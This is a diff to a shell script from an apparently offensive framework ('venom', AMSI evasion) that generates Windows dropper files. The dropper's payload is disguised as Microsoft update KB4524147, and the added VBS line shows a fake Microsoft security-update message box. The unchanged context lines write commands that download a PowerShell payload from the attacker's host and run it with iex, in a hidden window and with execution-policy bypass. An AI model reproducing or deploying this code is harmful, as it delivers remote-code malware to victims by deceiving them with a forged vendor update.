@@ -11941,6 +11941,9 @@ exit
 sh_ninja () {
 echo ${BlueF}[${YellowF}i${BlueF}]${white} Loading Amsi ${YellowF}[Evasion]${white} agents ..${Reset};sleep 2
 easter_egg=$(cat $IPATH/settings|grep -m 1 'OBFUSCATION'|cut -d '=' -f2)
+if [ "$easter_egg" = "ON" ] || [ "$easter_egg" = "on" ]; then
+   echo ${BlueF}[${YellowF}i${BlueF}]${white} Silent Execution [${GreenF}ON${white}]${Reset};sleep 2
+fi
 cat << !
 
 
@@ -12068,9 +12071,10 @@ if [ "$easter_egg" = "OFF" ] || [ "$easter_egg" = "off" ]; then
    echo "echo \"& ('ie'+'x') \`\$proxy.responseText;\" >> \$env:$rpath\\KB4524147_4nF7.ps1" >> $IPATH/output/$Drop.ps1
    echo "Start-Sleep -Seconds 2;PoWeRsHeLl -Execution Bypass -WindowStyle Hidden -NoProfile -File \"\$env:$rpath\\KB4524147_4nF7.ps1\"" >> $IPATH/output/$Drop.ps1 
 else
-   ## Silent Execution -> OBFUSCATION=ON (none terminal popup)
+   ## Silent Execution -> OBFUSCATION=ON (none terminal pops up)
    echo "' Framework: venom v1.0.16 (amsi evasion)" > $IPATH/output/$Drop.vbs
    echo "Set objShell = WScript.CreateObject(\"WScript.Shell\")" >> $IPATH/output/$Drop.vbs
+   echo "MsgBox(\"Cumulative Security Update KB4524147\" & vbCrLf & \"Microsoft Corporation. All Rights Reserved\")" >> $IPATH/output/$Drop.vbs
    echo "objShell.Run \"cmd /c powershell \$proxy=new-object -com WinHttp.WinHttpRequest.5.1;\$proxy.open('GET','http://$lhost/$NaM.ps1',\$false);\$proxy.send();iex \$proxy.responseText;\", 0, True" >> $IPATH/output/$Drop.vbs
 fi
 
